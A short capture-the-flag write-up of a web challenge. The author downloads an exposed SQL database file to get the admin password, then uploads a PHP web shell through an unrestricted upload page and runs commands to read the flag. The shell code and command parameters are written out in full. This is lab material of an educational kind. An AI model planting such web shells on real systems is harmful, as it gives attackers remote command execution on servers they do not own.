CTFd —  go here 4 shell (part 2)

So far :

I have the source for login.php and admin.php

SQL injection and brute force attacks haven’t got me anywhere

In the Login source there’s a mention of db.sql database so I think of how I can leak the database. I try the following :

?page=dg.sql

?file=dg.sql

But I realized the parser is going to add .php to the file name so that would not work.

Can I just use /login.php to go to the page?

Yes I can!

Can I just request for the database like that?

Yes that worked!

/dg.sql

It was that simple? I kinda felt sad that it took so long

Anyway, so I have the database now which revealed the admin password

Logged in as admin and now there’s an upload page like I could see in the source.

I uploaded a .JPEG which could then be viewed by clicking its <a href> name </a>. Then I tried uploading a .txt file with the following payloads :

echo 'does this work' > temp.txt

echo '<?php passthru($_GET["cmd"]); ?>' > shell.php

Didn’t work, so then I just uploaded a .php file with a shell payload directly as cmd.php :

<?php

$cmd=$_GET['cmd'];

system($cmd)

?>

But I took a precaution to change the content-type of the POST request in Burp from text/php to image/jpeg (later I figured it didn’t matter and the exploit worked even without doing that)

Gave it the following parameter :

?cmd=pwd

And I got a command execution! Home stretch!

?cmd=cat%20/flag.txt
